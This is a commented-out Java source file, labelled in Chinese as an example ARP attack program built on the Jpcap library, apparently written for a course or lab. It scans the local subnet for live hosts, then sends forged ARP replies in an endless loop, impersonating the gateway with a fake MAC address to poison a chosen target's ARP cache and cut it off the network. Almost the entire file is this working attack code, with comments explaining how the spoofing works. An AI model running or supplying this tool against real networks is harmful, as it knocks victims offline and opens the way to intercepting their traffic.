/*
package software.arp;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.*;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

*/
/**
 * 基于Jpcap的ARP攻击程序范例
 *//*


public class MyARPAttack {

    public static NetworkInterface device;
    public static Scanner scanner = new Scanner(System.in);


    */
/**
     * 程序入口
     *
     * @param args
     * @throws IOException
     * @throws InterruptedException
     *//*


    public static void main(String[] args) throws Exception {

        //选择网卡
        device = getNetworkInterface();
        arpScan(device);
        System.out.print("目的（被攻击）主机IP地址>> ");
        ARPAttack(scanner.next(), 1000);//192.168.133

    }

    private static NetworkInterface getNetworkInterface() {
        //枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            System.out.println("NIC " + i + "\nname:" + devices[i].description +
                    "\nip:" + devices[i].addresses[1].address.getHostAddress() +
                    "\nmac:" + macToStr(devices[i].mac_address));
            System.out.println("");
        }

        System.out.println("如果某个网络接口显示的ip地址是ipv6而不是ipv4地址说明不支持该网络接口！");
        System.out.print("\n选择一个网卡：");
        device = devices[scanner.nextInt()];
        return device;
    }

    */
/**
     * 获取网络接口设备的网关 ip (只能获取网关是 x.x.x.1的情况)
     *
     * @param device 网络接口设备
     * @return
     *//*

    public static String getGatewayAddr(NetworkInterface device) {
        //通过设备 ip 地址获取子网地址，进而获取子网内所有 ip 地址
        String hostIpAddr = device.addresses[1].address.getHostAddress();
        */
/* split表达式，其实就是一个正则表达式。
           而 * . ^ | 等符号在正则表达式中属于一种有特殊含义的字符，
           如果使用此种字符作为分隔符，必须使用转义符即\\加以转义。
        *//*

        String[] addrFlagments = hostIpAddr.split("\\.");
        String gatewayAddr = addrFlagments[0] + "." + addrFlagments[1] +
                "." + addrFlagments[2] + ".2";

        return gatewayAddr;
    }
    */
/**
     * 获取子网内的所有 ip 地址(广播地址和网络地址除外)
     *
     * @param netAddr 网络地址 形如 "192.168.31.0" （默认只能处理.0结尾）
     * @return x.x.x.1~x.x.x.254 地址集合
     *//*

    public static List<String> getAllIp(String netAddr) {
        List<String> ips = new ArrayList<>();
        String ip = netAddr.substring(0, netAddr.length() - 1);

        for (int i = 1; i < 255; i++) {
            ips.add(ip + i);
        }

        return ips;
    }
    */
/**
     * 获取局域网内所有存活的主机 ip 的对应的 mac 地址
     *
     * @param dev 网络接口设备
     * @return key 点分十进制 ip, value 为该ip对应的 mac 地址的存活主机的 map
     * @throws Exception
     *//*

    public static void arpScan(NetworkInterface dev)
            throws Exception {
        JpcapCaptor captor = JpcapCaptor.openDevice(dev, 2000, false, 200);
        // 过滤出第 7 到 7+1 字节值为 2 的 arp 分组(ARP Reply)
        captor.setFilter("arp[7:1] == 2", true);

        Map<String, byte[]> ipAndMac = new HashMap<>();
        JpcapSender sender = captor.getJpcapSenderInstance();
        String netAddr = getGatewayAddr(dev);
        List<String> ips = getAllIp(netAddr);

        System.out.println("ARP 扫描开始，预计耗时 2min......");

        for (String ip : ips) {
            ARPPacket packet = createARP(ARPPacket.ARP_REQUEST,
                    dev.addresses[1].address.getHostAddress(),
                    macToStr(dev.mac_address),
                    ip, "00-00-00-00-00-00");
            sender.sendPacket(packet);
            // System.out.println("send arp request to \"" + ip + "\"");

            // 抓取回复
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null || !Arrays.equals(p.target_hardaddr, dev.mac_address)) {
                System.out.println("\"" + ip + "\" isn't exits.");
            } else {
                System.out.println("\"" + ip + "\"'s mac address is: " + macToStr(p.sender_hardaddr));
                ipAndMac.put(ip, p.sender_hardaddr);
            }
        }

        System.out.println("\nARP 扫描结束！扫描到局域网内存活主机信息如下：");
        for (String ip : ipAndMac.keySet()) {
            System.out.println("ip: " + ip + "  mac:" + macToStr(ipAndMac.get(ip)));
        }

       // return ipAndMac;
    }

    */
/**
     * 构造一个用以太封装的 ARP 分组
     *
     * @param operation Request=1, Reply=2
     * @param srcIP     点分十进制表示的源 ip 地址
     * @param srcMac    形如 "00-0C-29-95-AF-C8" 的源 mac 地址
     * @param desIp     点分十进制表示的源 ip 地址
     * @param desMac    形如 "00-0C-29-95-AF-C8" 的目的 mac 地址
     * @return 以太封装的 ARP 分组
     * @throws UnknownHostException ip 地址不合法
     *//*

    public static ARPPacket createARP(short operation, String srcIP, String srcMac, String desIp, String desMac)
            throws UnknownHostException {
        // 构造ARP包
        ARPPacket arpPacket = new ARPPacket();
        InetAddress srcip = InetAddress.getByName(srcIP);
        byte[] srcmac = sToMac(srcMac);
        InetAddress desip = InetAddress.getByName(desIp);
        byte[] desmac = sToMac(desMac);

        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.operation = operation;
        arpPacket.sender_hardaddr = srcmac;
        arpPacket.sender_protoaddr = srcip.getAddress();
        arpPacket.target_hardaddr = desmac;
        arpPacket.target_protoaddr = desip.getAddress();

        // 构造以太帧头
        EthernetPacket ethernetPacket = new EthernetPacket();
        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethernetPacket.src_mac = srcmac;
        if (operation == ARPPacket.ARP_REQUEST) {
            ethernetPacket.dst_mac = sToMac("ff-ff-ff-ff-ff-ff");
        } else {
            ethernetPacket.dst_mac = desmac;
        }

        arpPacket.datalink = ethernetPacket;

        return arpPacket;
    }


    */
/**
     * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
     *
     * @param ip //未知MAC地址主机的IP地址
     * @return //已知IP地址的MAC地址
     * @throws IOException
     *//*

    public static byte[] getOtherMAC(String ip) throws IOException {
        System.out.print("本机（攻击方）IP地址>> ");
        String attIP = scanner.next();
        JpcapCaptor jc = JpcapCaptor.openDevice(device, 2000, false, 3000); //打开网络设备，用来侦听
        JpcapSender sender = jc.getJpcapSenderInstance(); //发送器JpcapSender，用来发送报文
        InetAddress senderIP = InetAddress.getByName(attIP); //设置本地主机的IP地址，方便接收对方返回的报文(攻击方) 192.168.134.1
        InetAddress targetIP = InetAddress.getByName(ip); //目标主机的IP地址

        ARPPacket arp = new ARPPacket(); //开始构造一个ARP包
        arp.hardtype = ARPPacket.HARDTYPE_ETHER; //硬件类型
        arp.prototype = ARPPacket.PROTOTYPE_IP; //协议类型
        arp.operation = ARPPacket.ARP_REQUEST; //指明是ARP请求包
        arp.hlen = 6; //物理地址长度
        arp.plen = 4; //协议地址长度

        arp.sender_hardaddr = device.mac_address; //ARP包的发送端以太网地址,在这里即本地主机地址
        arp.sender_protoaddr = senderIP.getAddress(); //发送端IP地址, 在这里即本地IP地址
        byte[] broadcast = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255}; //广播地址
        arp.target_hardaddr = broadcast; //设置目的端的以太网地址为广播地址
        arp.target_protoaddr = targetIP.getAddress(); //目的端IP地址

        //构造以太帧首部
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP; //帧类型
        ether.src_mac = device.mac_address; //源MAC地址
        ether.dst_mac = broadcast; //以太网目的地址，广播地址
        arp.datalink = ether; //将arp报文的数据链路层的帧设置为刚刚构造的以太帧赋给
        sender.sendPacket(arp); //发送ARP报文

        while (true) { //获取ARP回复包，从中提取出目的主机的MAC地址，如果返回的是网关地址，表明目的IP不是局域网内的地址

            Packet packet = jc.getPacket();
            if (packet instanceof ARPPacket) {
                ARPPacket p = (ARPPacket) packet;
                if (p == null) {
                    throw new IllegalArgumentException(targetIP + " is not a local address"); //这种情况也属于目的主机不是本地地址
                }
                if (Arrays.equals(p.target_protoaddr, senderIP.getAddress())) {
                    System.out.println("get mac ok");

                    return p.sender_hardaddr; //返回
                }
            }
        }
    }

    */
/**
     * 将字符串形式的MAC地址转换成存放在byte数组内的MAC地址
     *
     * @param str 字符串形式的MAC地址，如：AA-AA-AA-AA-AA
     * @return 保存在byte数组内的MAC地址
     *//*


    public static byte[] sToMac(String str) {
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
        String[] s1 = str.split("-");
        for (int x = 0; x < s1.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }
        return mac;
    }

    */
/**
     * mac字节转字符串的方法
     *//*

    public static String macToStr(byte[] bytes) {
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < bytes.length; i++) {
            str.append(Integer.toString(bytes[i] & 0xff, 16));
            if (i < bytes.length - 1) {
                str.append("-");
            }
        }
        return str.toString();
    }

    */
/**
     * 执行ARP断网攻击。原理是：冒充网关发送出来的ARP应答包，令接收端更改其ARP缓存表，修改网关IP地址对应的MAC地址，从而令数据无法正常通过网关发出。
     *
     * @param ip
     * @param time
     * @throws InterruptedException
     * @throws IOException
     *//*


    public static void ARPAttack(String ip, int time) throws InterruptedException, IOException {
        JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
        jpcap.setFilter("arp", true);
        JpcapSender sender = JpcapSender.openDevice(device);
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;//硬件类型
        arp.prototype = ARPPacket.PROTOTYPE_IP; //协议类型
        arp.operation = ARPPacket.ARP_REPLY; //指明是ARP应答包包
        arp.hlen = 6;
        arp.plen = 4;

        byte[] srcmac = sToMac("D0-F0-00-30-F0-70"); // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
        arp.sender_hardaddr = srcmac;
        System.out.print("源IP地址>> ");
        arp.sender_protoaddr = InetAddress.getByName(scanner.next()).getAddress();//192.168.134.2断网；192.168.134.131欺骗攻击，通信失败
        arp.target_hardaddr = getOtherMAC(ip);
        arp.target_protoaddr = InetAddress.getByName(ip).getAddress();

        //设置数据链路层的帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = srcmac; //停止攻击一段时间后，目标主机会自动恢复网络。若要主动恢复，这里可用getOtherMAC("10.96.0.1");
        ether.dst_mac = getOtherMAC(ip);
        arp.datalink = ether;

        // 发送ARP应答包 。因为一般主机会间隔一定时间发送ARP请求包询问网关地址，所以这里需要设置一个攻击周期。

        while (true) {
            System.out.println("sending ARP..");
            sender.sendPacket(arp);
            Thread.sleep(time);
        }

    }

}*/
